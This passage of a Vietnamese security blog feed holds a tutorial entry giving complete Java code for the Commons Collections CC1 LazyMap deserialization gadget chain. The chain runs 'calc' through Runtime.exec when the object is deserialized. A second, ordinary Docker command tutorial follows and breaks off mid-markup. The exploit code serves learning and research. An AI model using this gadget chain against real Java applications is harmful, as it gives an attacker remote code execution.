class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class), </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span></span><br><span class="line">                        , <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line">        <span class="comment">//lazyMap.get(null);</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">aihClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">aihConstructor</span> <span class="operator">=</span> aihClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        aihConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">aihInstance</span> <span class="operator">=</span> (InvocationHandler) aihConstructor.newInstance(Override.class, lazyMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(aihClass.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,aihInstance);</span><br><span class="line">        <span class="type">Set</span> <span class="variable">set</span> <span class="operator">=</span> proxyMap.entrySet();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Chuoi-hoan-chinh"><a href="#Chuoi-hoan-chinh" class="headerlink" title="Chuỗi hoàn chỉnh"></a>Chuỗi hoàn chỉnh</h3><p>Để ý một chút ở hàm readObject của lớp <code>AnnotationInvocationHandler</code></p><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/12/15/CommonsCollections1-LazyMap/AnnotationInvocationHandler-readObject.png"></p><p><code>this.memberValues</code> là LazyMap chúng ta có thể truyền vào, và nó gọi đến entrySet(). Do đó khi readObject của lớp <code>AnnotationInvocationHandler</code> thực thi chúng ta có thể kích hoạt câu lệnh calc.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span></span><br><span class="line">                        , <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line">        <span class="comment">//lazyMap.get(null);</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">aihClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">aihConstructor</span> <span class="operator">=</span> aihClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        aihConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">aihInstance</span> <span class="operator">=</span> (InvocationHandler) aihConstructor.newInstance(Override.class, lazyMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(aihClass.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,aihInstance);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">aihProxyObject</span> <span class="operator">=</span> aihConstructor.newInstance(Override.class, proxyMap);</span><br><span class="line">        serialize(aihProxyObject);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/12/15/CommonsCollections1-LazyMap/ChuoiHoanChinh.png"></p><p>Máy tính đã bật lên và chuỗi của chúng ta đã được xây dựng thành công~</p><h2 id="Loi-ket"><a href="#Loi-ket" class="headerlink" title="Lời kết"></a>Lời kết</h2><p>Proxy động là một kiến thức khá phức tạp với những bạn mới bắt đầu, mình khuyên các bạn chỉ cần học và hiểu cách sử dụng, đừng đào sâu vào code gốc bởi vì đó là một lượng kiến thức lớn do những người đi trước đã viết ra. Khởi tạo Proxy động cần đến class loader các bạn chỉ cần biết tải lớp nào cần class loader nào là đủ hoặc cứ cho đại null, không đúng thì abc.class.getClassLoader(), không cần tìm hiểu sâu vào nó.</p><blockquote><p>Chúc các bạn học tốt~</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Trong bài viết trước mình đã phân tích lỗ hổng deserialization của TransformMap trong chuỗi CC1, và trong bài viết này mình sẽ thực hiện </summary>
      
    
    
    
    <category term="Java" scheme="https://rayinaw.github.io/categories/Java/"/>
    
    <category term="Deserialization" scheme="https://rayinaw.github.io/categories/Java/Deserialization/"/>
    
    
    <category term="Java" scheme="https://rayinaw.github.io/tags/Java/"/>
    
    <category term="Deserialization" scheme="https://rayinaw.github.io/tags/Deserialization/"/>
    
    <category term="Commons Collections" scheme="https://rayinaw.github.io/tags/Commons-Collections/"/>
    
  </entry>
  
  <entry>
    <title>Một bản ghi chép nhỏ về Docker</title>
    <link href="https://rayinaw.github.io/2022/12/03/docker-learning/"/>
    <id>https://rayinaw.github.io/2022/12/03/docker-learning/</id>
    <published>2022-12-02T18:13:09.000Z</published>
    <updated>2022-12-05T10:06:31.773Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Docker-Command-Line"><a href="#Docker-Command-Line" class="headerlink" title="Docker Command Line"></a>Docker Command Line</h1><h2 id="Thao-tac-voi-moi-lan-chay"><a href="#Thao-tac-voi-moi-lan-chay" class="headerlink" title="Thao tác với mỗi lần chạy:"></a>Thao tác với mỗi lần chạy:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker run busybox:1.24 echo &quot;hello world!&quot;</span><br><span class="line"></span><br><span class="line">docker run busybox:1.24 ls /</span><br></pre></td></tr></table></figure><h2 id="i-va-t-flag"><a href="#i-va-t-flag" class="headerlink" title="-i và -t flag:"></a>-i và -t flag:</h2><p>Flag -i dùng để mở một tương tác với container, giữ cho nó tiếp tục được mở để thực thi những tác vụ tiếp.<br>Flag -t dùng để tạo một pseudo-TTY(TTY tương tự như shell command trong linux), có nghĩa là tạo một shell của image rồi gắn vào terminal của mình.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">docker run -i -t busybox:1.24</span><br><span class="line">hay</span><br><span class="line">docker run -it busybox:1.24</span><br><span class="line">Kết quả:</span><br><span class="line">&gt; docker run -it busybox:1.24</span><br><span class="line">/ # ls</span><br><span class="line">bin   dev   etc   home  proc  root  sys   tmp   usr   var</span><br></pre></td></tr></table></figure><h2 id="Docker-container-va-d-flag"><a href="#Docker-container-va-d-flag" class="headerlink" title="Docker container và -d flag:"></a>Docker container và -d flag:</h2><p>Khi chạy một cách bình thường, nó sẽ thực thi lệnh trực tiếp trên terminal của chúng ta (run container in foreground). Nhưng nếu chúng ta muốn nó không chạy trên terminal mà chạy ở trong container (run container in background).<br>Ví dụ khi chạy lệnh sleep 1000:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Không chạy với tag -d:</span><br><span class="line">docker run  busybox:1.24 sleep 1000</span><br><span class="line">nó sẽ sleep trực tiếp trên terminal(mở terminal mới đi bro :P)</span><br><span class="line">Chạy với tag -d:</span><br><span class="line">docker run -d busybox:1.24 sleep 1000</span><br><span class="line">&gt; docker ps</span><br><span class="line">CONTAINER ID   IMAGE          COMMAND        CREATED         STATUS         PORTS     NAMES</span><br><span class="line">4b69615931bb   busybox:1.24   &quot;sleep 1000&quot;   7 seconds ago   Up 6 seconds             eloquent_newton</span><br></pre></td></tr></table></figure><p>Để xem container đang chạy gõ <code>docker ps</code>(chạy trong background hoặc trên terminal), với container đã dừng gõ <code>docker ps -a</code>.<br>Để không lưu lại container khi kết thúc docker container chúng ta dùng tag –rm, khi đó nếu quy trình kết thúc, docker sẽ tự động xóa container mà không lưu vào <code>docker ps -a</code>.</p><h2 id="–name-flag"><a href="#–name-flag" class="headerlink" title="–name flag:"></a>–name flag:</h2><p>Đặt tên cho container mỗi lần chạy.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run --name hello_world busybox:1.24</span><br></pre></td></tr></table></figure><h2 id="p-flag"><a href="#p-flag" class="headerlink" title="-p flag:"></a>-p flag:</h2><p><code>-p host_port:container_port</code> : map cổng của container sang cổng máy thật. Chúng ta có thể map nhiều cặp port một lần bằng cách viết liên tiếp những cặp đó <code>-p 8888:8080 80:4444</code>.<br>Ví dụ với tomcat server, tomcat là một open source web server thực thi Java servlet. Tomcat image này chạy ở port 8080:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -p 8888:8080 tomcat:8.0</span><br><span class="line">Đợi một lát để nó pull tomcat:8.0 về.</span><br><span class="line">Sau khi tải xong truy cập http://localhost:8888/ trên browser. Tomcat đã chạy trên port 8888.</span><br><span class="line">Mình sẽ giải thích một chút:</span><br><span class="line">- Tomcat này là một container (xem như là một máy ảo cho dễ hình dung nhưng hầu như không phải nhé ^^), nó chạy trên port 8080 của máy chủ tomcat này.</span><br><span class="line">- Sau khi map qua cổng của localhost, cổng 8888 bây giờ sẽ như là cổng 8080 của máy chủ tomcat vậy.</span><br></pre></td></tr></table></figure><h2 id="Docker-log"><a href="#Docker-log" class="headerlink" title="Docker log:"></a>Docker log:</h2><p>Khi chạy một server qua terminal, nhật kí sẽ được ghi lại trực tiếp ở trên terminal. Khi chạy server qua container background để xem nhật kí của server chúng ta sử dụng câu lệnh <code>docker logs</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt; docker run -it -d -p 8888:8080 tomcat:8.0</span><br><span class="line">4cc4583095b59189adaa0dc202944d5cdd5968df403584a84b26d6e57c585bd7</span><br><span class="line">pwn@DESKTOP-AC6UABE:pts/3-&gt;/home/pwn (0)</span><br><span class="line">&gt; docker logs 4cc4583095b59189adaa0dc202944d5cdd5968df403584a84b26d6e57c585bd7</span><br><span class="line">Using CATALINA_BASE:   /usr/local/tomcat</span><br><span class="line">Using CATALINA_HOME:   /usr/local/tomcat</span><br><span class="line">Using CATALINA_TMPDIR: /usr/local/tomcat/temp</span><br><span class="line">Using JRE_HOME:        /docker-java-home/jre</span><br><span class="line">......phần log ở dưới dài nên mình cắt......</span><br><span class="line">Hoặc lấy id từ docker ps rồi docker logs &lt;id&gt;</span><br></pre></td></tr></table></figure><h2 id="Docker-pull"><a href="#Docker-pull" class="headerlink" title="Docker pull:"></a>Docker pull:</h2><p>Câu lệnh này dùng để lấy image từ trên hub của docker về. Ví dụ:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker pull mysql:lastest</span><br><span class="line">docker pull nginx</span><br></pre></td></tr></table></figure><h2 id="Docker-commit"><a href="#Docker-commit" class="headerlink" title="Docker commit:"></a>Docker commit:</h2><p>Lệnh <code>docker commit</code> dùng để lưu những thay đổi trong file system của một Docker container vào image mới.<br>Syntax: <code>docker commit container_id repository_name:tag</code></p><h2 id="Docker-build-command"><a href="#Docker-build-command" class="headerlink" title="Docker build command"></a>Docker build command</h2><p>Câu lệnh <code>docker build</code> dùng để build một image từ một Dockerfile và context (nơi chứa những thứ như file php, java,… cần dùng để build). Hai thứ này được chứa trong cùng một folder, chúng ta gắn URL hoặc path để chỉ cho docker biết nơi chứa 2 cái này.<br>Systax:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker build [OPTIONS] PATH</span><br><span class="line">Ví dụ:</span><br><span class="line">docker build -t image_name .</span><br></pre></td></tr></table></figure><ul><li>-t flag dùng để đặt tên cho image.</li><li>Dấu <code>.</code> để nói cho docker biết là tìm Dockerfile ở thư mục hiện tại, đây là path dẫn đến Dockerfile.</li></ul><h2 id="Docker-inspect"><a href="#Docker-inspect" class="headerlink" title="Docker inspect:"></a>Docker inspect:</h2><p>Mô tả thông tin low level của một container hay image.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; docker run -d busybox:1.24 sleep 100</span><br><span class="line">0c06e0155702fcb6dc7969eac63f68d74f5781dbc6960461ee88dc3c15942ea9</span><br><span class="line">pwn@DESKTOP-AC6UABE:pts/4-&gt;/home/pwn (0)</span><br><span class="line">&gt; docker inspect 0c06e0155702fcb6dc7969eac63f68d74f5781dbc6960461ee88dc3c15942ea9</span><br></pre></td></tr></table></figure><h2 id="Go-Image-va-Container"><a href="#Go-Image-va-Container" class="headerlink" title="Gỡ Image và Container:"></a>Gỡ Image và Container:</h2><h3 id="Go-container"><a href="#Go-container" class="headerlink" title="Gỡ container:"></a>Gỡ container:</h3><ul><li>Đầu tiên phải dừng container đang chạy: <code>docker stop &lt;id container&gt;</code></li><li>Gõ <code>docker ps -a</code> để xem container đã dừng.</li><li><code>docker rm -f &lt;id container đã dừng&gt;</code>, -f flag ở đây là cờ bắt buộc gỡ, nên xài để gỡ thuận tiện hơn.</li></ul><h3 id="Go-image"><a href="#Go-image" class="headerlink" title="Gỡ image:"></a>Gỡ image:</h3><ul><li><code>docker rmi &lt;tên image&gt;</code></li></ul><h1 id="Docker-Container’s-Filesystem"><a href="#Docker-Container’s-Filesystem" class="headerlink" title="Docker Container’s Filesystem"></a>Docker Container’s Filesystem</h1><h2 id="Docker-images-va-layers"><a href="#Docker-images-va-layers" class="headerlink" title="Docker images và layers:"></a>Docker images và layers:</h2><p>Một Docker images được xây dựng từ những layer. Mỗi layer đại diện cho mỗi lệnh trong Dockerfile, hay khi chạy lệnh bằng cách build thông qua Docker Commint Command ở phần sau.<br>Mỗi câu lệnh có thay đổi file của một container đều tạo ra một layer mới. Để dễ hình dung chúng ta cùng đi qua ví dụ sau(Lấy từ docs.docker.com):</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">18.04</span></span><br><span class="line"><span class="keyword">LABEL</span><span class="language-bash"> org.opencontainers.image.authors=<span class="string">&quot;org@example.com&quot;</span></span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> . /app</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> make /app</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">rm</span> -r <span class="variable">$HOME</span>/.cache</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> python /app/app.py</span></span><br></pre></td></tr></table></figure><p>Khi chạy file trên, nó sẽ tạo ra một Docker image mới có cấu hình theo các câu lệnh được chạy ở file trên. Câu lệnh LABEL không liên quan đến file hệ thống. Câu lệnh COPY thêm file ở thư mục chứa Dockerfile vào thư mục &#x2F;app của container. Tuy nhiên nó chỉ COPY trong quá trình chạy, để viết thay đổi đó vào layer của một image mới chúng ta cần chạy lệnh <code>RUN make /app</code>, khi này một layer mới mới được tạo. <code>RUN rm -r $HOME/.cache</code> gỡ thư mục cache, câu lệnh RUN này sẽ tạo ra một layer mới. Câu lệnh CMD cuối cùng chỉ để chạy command python khi container đang chạy và không tạo layer mới.</p><p>Để xem các layers của một image chúng ta dùng lệnh <code>docker image history &lt;id&gt;</code></p><h2 id="Docker-container-va-writable-layer"><a href="#Docker-container-va-writable-layer" class="headerlink" title="Docker container và writable layer:"></a>Docker container và writable layer:</h2><p>Docker container được tạo từ những docker image chỉ đọc hay không thay đổi được. Một docker container được tạo từ một image sẽ có thêm một lớp ở trên, lớp này được gọi là <code>writable layer</code>hay <code>container layer</code>. Mọi thay đổi trong container này sẽ được lưu vào lớp này.</p><p>Khi nghiên cứu tới đây, mình có một thắc mắc là như đã nói, khi tạo một container việc thay đổi trong container này chỉ thay đổi lớp writable, rồi một image là không thay đổi được vậy thì tại sao chúng ta có thể thay đổi file hệ thống khi chạy container?. Theo mình hiểu thì nó như này:</p><ul><li>Khi chúng ta tạo một container, nó như là một máy mới được tạo ra vậy, chúng ta có thể thay đổi các file, folder trong máy mới này. Nó sẽ không ảnh hưởng gì đến các image cả vì nó riêng biệt mà.</li><li>Thế rồi writable đó để làm gì? Khi thay đổi một container chạy từ một image rồi lưu lại thành một image mới, người ta sẽ lưu lại quy trình theo từng bước khiến file hệ thống bị thay đổi để tạo quá trình build image mới này có trình tự, và chắc cũng dễ dàng hơn. Và khi này những bước thay đổi đó sẽ được lưu xuống lớp writable, nếu chúng ta commit thay đổi này, những cái thay đổi thực hiện ghi lại trong lớp writable này sẽ được lưu lại theo những layer mới xếp chồng lên những layer của image cũ.</li></ul><h1 id="Cach-build-mot-Docker-image"><a href="#Cach-build-mot-Docker-image" class="headerlink" title="Cách build một Docker image:"></a>Cách build một Docker image:</h1><p>Có hai cách để build một docker image:</p><ul><li>Commit những cái đã build, thay đổi trong một Docker container vào một image mới.</li><li>Viết một Dockerfile.<br>Bây giờ chúng ta cùng đi cụ thể vào từng cách để build một docker image.</li></ul><h2 id="Build-Docker-Images-by-using-Docker-Commit-Command"><a href="#Build-Docker-Images-by-using-Docker-Commit-Command" class="headerlink" title="Build Docker Images by using Docker Commit Command:"></a>Build Docker Images by using Docker Commit Command:</h2><p>Giả sử chúng ta chúng ta có một base image là một debian (hệ điều hành tương tự linux), khi run image này nó không có Git command. Bây giờ để thuận tiện hơn chúng ta tạo một image mới có cài sẵn Git dựa trên debian image kia để chúng ta không phải cài lại Git mỗi lần chạy. Khi đó chúng ta có ba bước để thực hiện như sau:</p><ul><li><ol><li>Tạo một container từ base image</li></ol></li><li><ol start="2"><li>Install Git pakage trong container.</li></ol></li><li><ol start="3"><li>Commit thay đổi trong container đã làm.<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Pull và chạy debian</span></span><br><span class="line">docker <span class="keyword">run</span><span class="language-bash"> -it debian:jessie</span></span><br><span class="line"><span class="comment"># Cài Git cho container này</span></span><br><span class="line">apt-get update &amp;&amp; apt-get install --force-yes git</span><br><span class="line"><span class="comment"># Commit thay đổi, gõ &quot;docker ps -a&quot; để lấy id của container này.</span></span><br><span class="line">docker commit ba638bca3016 rayinaw/debian:update</span><br><span class="line"><span class="comment"># Trả về sha256:3e6332e9ae0a1597a25d213bf42b0592e3291969259d631c3eacc893f4735171</span></span><br><span class="line">Gõ docker images để thấy một image mới đã được tạo. Size nó lớn hơn debian cũ <span class="number">100</span> mb, là dung lượng của git.</span><br><span class="line">Bây giờ chạy để test.</span><br><span class="line">docker <span class="keyword">run</span><span class="language-bash"> -it rayinaw/debian:update</span></span><br><span class="line">Gõ git trong terminal của debian chúng ta tạo, git đã được cài vào image mới thành công.</span><br></pre></td></tr></table></figure></li></ol></li></ul><h2 id="Build-Docker-Images-by-writing-DockerFile"><a href="#Build-Docker-Images-by-writing-DockerFile" class="headerlink" title="Build Docker Images by writing DockerFile:"></a>Build Docker Images by writing DockerFile:</h2><h3 id="Dockerfile-la-gi"><a href="#Dockerfile-la-gi" class="headerlink" title="Dockerfile là gì?"></a>Dockerfile là gì?</h3><p>Dockerfile là một file văn bản chứa những lệnh user cung cấp để build các image một cách tự động từ Dockerfile. Tên của Dockerfile phải là <code>Dockerfile</code> với D viết hoa ở đầu.<br>Mỗi lệnh trong Dockerfile sẽ tạo một image layer mới đối với image này. Các lệnh sẽ chỉ định điều cần làm khi building image.<br>Khi building image, Docker sẽ thực hiện quy trình tương tự như việc chúng ta build bằng commit command. Docker sẽ build lần lượt từng layer, khi build xong ở trong lớp writable container, nó sẽ viết xuống image mới, sau đó remove container đó, rồi lần lượt theo trình tự đó cho đến khi build đủ các layer trong Dockerfile. Việc viết xuống image mình không biết nó lưu ở đâu, nếu muốn tìm hiểu các bạn có thể tìm hiểu thêm về Docker daemon.</p><h3 id="Viet-mot-Dockerfile"><a href="#Viet-mot-Dockerfile" class="headerlink" title="Viết một Dockerfile:"></a>Viết một Dockerfile:</h3><p>Câu lệnh đầu tiên trong <code>Dockerfile</code> là câu lệnh <code>FROM</code> (viết hoa để phân biệt với from arguments), dùng để chỉ định base image.</p><h4 id="Cau-lenh-RUN"><a href="#Cau-lenh-RUN" class="headerlink" title="Câu lệnh RUN:"></a>Câu lệnh RUN:</h4><ul><li>Dùng để chỉ định câu lệnh thực thi khi chạy base image.</li><li>Câu lệnh RUN sẽ thực thi câu lệnh trong writable layer của container, sau đó commit container xuống image mới.</li><li>Image mới này sẽ được sử dụng cho bước tiếp theo trong Dockerfile. Vì vậy mỗi lần RUN lệnh, nó sẽ tạo ra một image layer mới.<br>Ví dụ tương tự như cách build qua Docker commit:<figure class="highlight 